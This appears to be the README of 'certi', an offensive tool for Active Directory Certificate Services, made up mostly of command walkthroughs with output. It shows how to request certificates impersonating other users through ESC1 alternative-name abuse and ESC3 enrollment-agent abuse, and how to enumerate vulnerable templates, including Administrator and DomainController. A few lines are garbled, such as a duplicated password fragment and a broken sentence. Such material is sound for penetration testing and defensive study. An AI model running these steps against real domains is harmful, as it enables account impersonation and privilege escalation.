# certi

Utility to play with ADCS, allows to request tickets and collect information about related objects. Basically, it's the impacket copy of [Certify](https://github.com/GhostPack/Certify). Thanks to [@harmj0y](https://twitter.com/harmj0y) and [@tifkin_](https://twitter.com/tifkin_) for [its great work with ADCS](https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf).

## Request a certificate

To request a certificate you can use the req command:
```
$ getTGT.py 'contoso.local/Anakin:Vader1234!'ader1234!'
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Saving ticket in Anakin.ccache
$ export KRB5CCNAME=Anakin.ccache
$ certi.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n
[*] Service: contoso-DC01-CA
[*] Template: User
[*] Username: Anakin

[*] Response: 0x3 Issued  0x80094004, The Enrollee (CN=Anakin,CN=Users,DC=contoso,DC=local) has no E-Mail name registered in the Active Directory.  The E-Mail name will not be included in the certificate.

[*] Cert subject: CN=Anakin,CN=Users,DC=contoso,DC=local
[*] Cert issuer: CN=contoso-DC01-CA,DC=contoso,DC=local
[*] Cert Serial: 75000000062BD9D6E3F1B15CC3000000000006
[*] Cert Extended Key Usage: Encrypting File System, Secure Email, Client Authentication

[*] Saving certificate in Anakin.pfx (password: admin)
```

As you may notice, you need to use Kerberos, since is the authentication method required by enrollment services. In case using other method you will get the following error:
```
(certi) certi$ certi.py req 'contoso.local/Anakin:Vader1234!@dc01.contoso.local' contoso-DC01-CA
Error: WCCE SessionError: code: 0x80094011 - CERTSRV_E_ENROLL_DENIED - The permissions on this CA do not allow the current user to enroll for certificates.
Help: Try using Kerberos authentication with -k -n params
```

### Request with an alternative name


You can use the `--alt-name` parameter to give an alternative subject and request a certificate that can be used to impersonate the target user if some template allows you to do that:
```
$ certi.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN
[*] Service: contoso-DC01-CA
[*] Template: UserSAN
[*] Username: Anakin
[*] Alternative Name: han

[*] Response: 0x3 Issued

[*] Cert subject: CN=Anakin
[*] Cert issuer: CN=contoso-DC01-CA,DC=contoso,DC=local
[*] Cert Serial: 750000000A858CC4B4C9301ED600000000000A
[*] Cert Extended Key Usage: Encrypting File System, Secure Email, Client Authentication
[+] Cert Altname: han@contoso.local

[*] Saving certificate in han@contoso.local.pfx (password: admin)

```

You can get the templates vulnerable to this by using the `--vuln` and `--enable` params of the list command (be sure ):

```
$ certi.py list 'contoso.local/Anakin' -k -n --dc-ip 192.168.100.2 --vuln --enable | grep ESC1 -B 3
Name: SubCA
Schema Version: 1
Enroll Services: contoso-DC01-CA
Vulnerabilities: ESC1 - SAN Impersonation, ESC2 - Any Purpose, ESC3.2 - Use Agent Certificate
--
Name: UserSAN
Schema Version: 2
Enroll Services: contoso-DC01-CA
Vulnerabilities: ESC1 - SAN Impersonation
```


### Request as an enrollment agent


In case the available templates allows you to do that, you can request a certificate for an enrollment agent and then use it to request a certificate for another user:

```
$ certi.py req 'contoso.local/Han@dc01.contoso.local' contoso-DC01-CA -k -n --template EnrollAgent
[*] Service: contoso-DC01-CA
[*] Template: EnrollAgent
[*] Username: Han

[*] Response: 0x3 Issued

[*] Cert subject: CN=Han
[*] Cert issuer: CN=contoso-DC01-CA,DC=contoso,DC=local
[*] Cert Serial: 75000000256F1BB99993785823000000000025
[*] Cert Extended Key Usage: Certificate Request Agent

[*] Saving certificate in Han.pfx (password: admin)
$ certi.py req 'contoso.local/Han@dc01.contoso.local' contoso-DC01-CA -k -n --on-behalf anakin --enroll-cert Han.pfx --enroll-cert-pw admin --template EnrollWithAgent
[*] Service: contoso-DC01-CA
[*] Template: EnrollWithAgent
[*] Username: Han
[*] On behalf of: anakin

[*] Response: 0x3 Issued

[*] Cert subject: CN=anakin
[*] Cert issuer: CN=contoso-DC01-CA,DC=contoso,DC=local
[*] Cert Serial: 750000002AB527D8E1E64930DC00000000002A
[*] Cert Extended Key Usage: Any Purpose, Certificate Request Agent, Encrypting File System, Secure Email, Client Authentication

[*] Saving certificate in anakin.pfx (password: admin)
```


You can check for templates vulnerable to these misconfigurations with the `list` command (we are that permissions may restrict you from request a certificate for a given template):
```
$ certi.py list 'contoso.local/Han' -k -n --dc-ip 192.168.100.2 --vuln --enable | grep ESC3 -B 3
Name: User
Schema Version: 1
Enroll Services: contoso-DC01-CA
Vulnerabilities: ESC3.2 - Use Agent Certificate
--
Name: Administrator
Schema Version: 1
Enroll Services: contoso-DC01-CA
Vulnerabilities: ESC3.2 - Use Agent Certificate
--
Name: Machine
Schema Version: 1
Enroll Services: contoso-DC01-CA
Vulnerabilities: ESC3.2 - Use Agent Certificate
--
Name: DomainController
Schema Version: 1
Enroll Services: contoso-DC01-CA
Vulnerabilities: ESC3.2 - Use Agent Certificate
--
Name: SubCA
Schema Version: 1
Enroll Services: contoso-DC01-CA
Vulnerabilities: ESC1 - SAN Impersonation, ESC2 - Any Purpose, ESC3.2 - Use Agent Certificate
--
Name: EnrollAgent
Schema Version: 2
Enroll Services: contoso-DC01-CA
Vulnerabilities: ESC3.2 - Use Agent Certificate
--
Name: EnrollwithAgent
Schema Version: 2
Enroll Services: contoso-DC01-CA
Vulnerabilities: ESC3.2 - Use Agent Certificate

```


## List services


```
$ certi.py list 'contoso.local/Han' -k -n --class service
[*] Enrollment Services

Name: contoso-DC01-CA
DNS name: dc01.contoso.local
Templates: EnrollwithAgent, EnrollAgent, UserSAN, DirectoryEmailReplication, DomainControllerAuthentication, KerberosAuthentication, EFSRecovery, EFS, DomainController, WebServer, Machine, User, SubCA, Administrator
Certificate:
  Cert Subject: CN=contoso-DC01-CA,DC=contoso,DC=local
  Cert Serial: 23D21EB948AC688545EC15FEB03B0C33
  Cert Start: 2021-08-01 12:49:46
  Cert End: 2026-08-01 12:59:46
  Cert Issuer: CN=contoso-DC01-CA,DC=contoso,DC=local

```


## List CAs

```
$ certi.py list 'contoso.local/Han' -k -n --dc-ip 192.168.100.2 --class ca
[*] Root CAs

Cert Subject: CN=contoso-DC01-CA,DC=contoso,DC=local
Cert Serial: 23D21EB948AC688545EC15FEB03B0C33
Cert Start: 2021-08-01 12:49:46
Cert End: 2026-08-01 12:59:46
Cert Issuer: CN=contoso-DC01-CA,DC=contoso,DC=local

[*] Authority Information Access

Cert Subject: CN=contoso-DC01-CA,DC=contoso,DC=local
Cert Serial: 23D21EB948AC688545EC15FEB03B0C33
Cert Start: 2021-08-01 12:49:46
Cert End: 2026-08-01 12:59:46
Cert Issuer: CN=contoso-DC01-CA,DC=contoso,DC=local

```
